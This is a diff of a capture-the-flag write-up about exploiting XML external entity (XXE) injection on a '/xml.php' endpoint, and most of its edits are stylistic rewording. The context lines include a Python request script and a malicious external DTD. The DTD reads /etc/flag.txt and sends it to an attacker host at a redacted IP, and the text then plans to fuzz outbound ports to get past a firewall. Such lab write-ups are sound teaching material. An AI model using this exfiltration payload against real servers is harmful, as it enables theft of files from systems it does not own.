@@ -58,9 +58,9 @@ Let us traverse to the path `/xml.php` on the server to see whether the file sti
 
 <img src="./attachments/xml.php.png" />
 
-We did not get a 404-error, which means that the file still exists. The response returns an error message stating that username or password was not found. This is because instead of sending a HTTP POST request with the XML data, a HTTP GET request was sent to the server.
+The server did not return a 404-error, which means that the file still exists. The response returns an error message stating that username or password was not found. This is because instead of sending a HTTP POST request with the XML data, a HTTP GET request was sent to the server.
 
-Let us send a simple HTTP POST request containing the XML data with username and password "admin" to the server for test purposes. We can easily achieve this with the help of Python3.
+Let us send a simple HTTP POST request containing the XML data with username and password "admin" to the server for test purposes. This can be easily achieved with the help of Python3 and the requests module.
 
 ```python
 import requests                   # Import requests module for making HTTP requests
@@ -96,7 +96,7 @@ Running the script `python3 send_request.py` lets us see the server response whe
 
 Yet again the same error as previously. 
 
-The server has to understand the data that we supply in the form of XML. That means that there must be an underlying XML parser parsing our input on the server.
+The server has to understand the data supplied in the form of XML. That means that there must be an underlying XML parser parsing our input on the server.
 
 What if we try to trick the XML parser into crashing? That might give us some extra information that could come in handy. We can do that by changing our XML data in a way that the username and/or password contains illegal characters that would usually throw off the XML parser.
 
@@ -274,7 +274,7 @@ Our current exploit indeed does have parameter entity reference within a markup 
 
 Luckily this does not affect external parameter entities, so we can just use an external DTD.
 
-Let's start by creating a malicious DTD file that we are going to use:
+Let's start by creating a malicious DTD file to be used:
 ```xml
 <!ENTITY % flag SYSTEM "php://filter/convert.base64-encode/resource=/etc/flag.txt">
 <!ENTITY % XXE "<!ENTITY exfil SYSTEM 'http://[IP REDACTED]/?flag=%flag;'>">
@@ -301,11 +301,11 @@ Let's spin up our server once again and send our payload.
 
 Hmm... There's nothing coming through... Is the server really vulnerable to XXE?
 
-Before giving up, there's one last thing that we should try.
+Before giving up, there's one last thing that should be tried.
 
 The challenge description said that this challenge was based on a real world example of a finding from a bug bounty target. In these realistic scenarios the developers (hopefully) try to make their systems secure. This means that they might use different kinds of external protections e.g. Web Application Firewall (WAF).
 
-There is a possibility that the server has a WAF instance filtering outbound traffic on port 80. We can simply fuzz other common ports to see if this hypothesis stands. If the WAF is configured in a way that it filters outbound traffic only on port 80, there is a possibility that we could exfiltrate the data over another port.
+There is a possibility that the server has a WAF instance filtering outbound traffic on port 80. We can simply fuzz other common ports to see if this hypothesis stands. If the WAF is configured in a way that it filters outbound traffic only on port 80, there is a possibility that the data could be exfiltrated over another port.
 
 Some common ports that should be fuzzed include ports 21 (FTP), 22 (SSH), 23 (TELNET), 25 (SMTP), etc.
 
